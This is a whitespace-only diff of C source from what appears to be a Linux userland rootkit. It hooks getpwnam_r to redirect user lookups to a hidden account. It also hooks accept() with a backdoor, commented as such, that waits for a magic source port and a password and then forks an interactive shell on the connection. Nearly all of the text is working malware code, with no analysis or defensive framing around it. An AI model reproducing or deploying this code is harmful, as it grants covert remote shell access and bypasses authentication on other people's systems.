@@ -27,7 +27,7 @@
 int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
 {
     if(strncmp(SU_USER, name, strlen(name)) == 0)
-    	return (int) libcalls[GETPWNAM_R](JACK_USER, pwd, buf, buflen, result);
+        return (int) libcalls[GETPWNAM_R](JACK_USER, pwd, buf, buflen, result);
 
     return (int) libcalls[GETPWNAM_R](name, pwd, buf, buflen, result);
 }
@@ -59,8 +59,8 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags)
 /* accept() backdoor -- to-do: spawn PTY instead of just interactive shell. */
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 {
-	const size_t pass_len = strlen(SHELL_PASS);
-	char password[pass_len];
+    const size_t pass_len = strlen(SHELL_PASS);
+    char password[pass_len];
     unsigned short int port;
     int retfd;
 
@@ -68,12 +68,12 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
     port  = ntohs(((struct sockaddr_in *) addr)->sin_port);
 
     if(port == MAGIC_PORT)
-	{
-		read(retfd, password, pass_len);
+    {
+        read(retfd, password, pass_len);
 
-		if(strncmp(password, SHELL_PASS, pass_len) == 0 && fork() == 0)
-			drop_shell(retfd);
-	}
+        if(strncmp(password, SHELL_PASS, pass_len) == 0 && fork() == 0)
+            drop_shell(retfd);
+    }
 
     return retfd;
 }
